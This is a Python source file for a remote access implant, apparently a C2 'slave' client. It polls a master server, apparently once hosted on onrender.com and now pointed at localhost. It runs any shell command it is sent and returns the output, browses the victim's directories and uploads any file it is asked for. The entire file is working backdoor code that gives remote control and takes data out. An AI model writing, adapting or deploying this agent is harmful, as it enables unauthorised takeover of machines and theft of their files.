import os
import socket
import requests
import time
import subprocess

SLEEP_IN_SECONDS = 2

hostname = socket.gethostname()
username = os.getlogin()
mac = "ff:94:c2:dd:9c:gg"
operating_system = "Ubuntu 23.04"

# base_url = "https://rune-master.onrender.com"
base_url = "http://127.0.0.1:8000"

def get_cmd_from_server():
    url = f"{base_url}/api/slave/command"
    payload = {"username":username,"mac":mac,"hostname":hostname,"os":operating_system}
    output = requests.post(url, json = payload)
    return output.json()

def get_shell_output(command):
    return subprocess.check_output(command, shell=True, universal_newlines=True)

def send_shell_response_to_server(content):
    url = f"{base_url}/api/slave/response/text"
    payload = {"mac":mac,"content":content}
    output = requests.post(url, json = payload)

def get_file_with_sizes_and_directory_names(directory):
    directories = []
    files_in_dir = []

    files = os.listdir(directory)
    print(f"[+] files = {files}")
    for file in files:
        path = os.path.join(directory, file)
        if os.path.isfile(path):
            size = os.path.getsize(path)
            files_in_dir.append({
                "name": file,
                "size": size
            })
        else:
            directories.append(file)
    return {"directories": directories, "files": files_in_dir, "working_dir": directory}

def send_file_browse_response_to_server(directory):
    if directory == "ROOT":
        directory="/"
    
    url = f"{base_url}/api/slave/response/filebrowse"
    files_n_directory_info = None
    try:
        files_n_directory_info = get_file_with_sizes_and_directory_names(directory)
    except:
        files_n_directory_info = {"directories": ["EXCEPTION IN SYSTEM"], "files": [], "working_dir": directory}
    payload = {**files_n_directory_info, "mac":mac}
    output = requests.post(url, json = payload)

def send_file_response_to_server(full_file_path):
    url = f"{base_url}/api/slave/response/file?mac={mac}"
    with open(full_file_path, "rb") as file:
        files = {'file': file}
        response = requests.post(url, files=files)


while True:
    print("[+] Getting command from server")
    response = get_cmd_from_server()
    if response == {}:
        print("[+] Nothing to do")
        time.sleep(SLEEP_IN_SECONDS)
        continue
    if response['type']=='SHELL':
        try:
            cmd_output = get_shell_output(response['command'])
            print("[+] Sending SHELL Response back to MASTER..")
            send_shell_response_to_server(cmd_output)
        except:
            print("[+] Sending SHELL ERROR back to MASTER..")
            send_shell_response_to_server("ERROR!!")
            
    elif response['type']=='FILEBROWSE':
        directory = response['command']
        print("[+] Sending FILEBROWSE Response back to MASTER..")
        send_file_browse_response_to_server(directory)

    elif response['type']=='FILEDOWNLOAD':
        full_file_path = response['command']
        print("[+] Sending FILEDOWNLOAD Response back to MASTER..")
        send_file_response_to_server(full_file_path)

    time.sleep(SLEEP_IN_SECONDS)
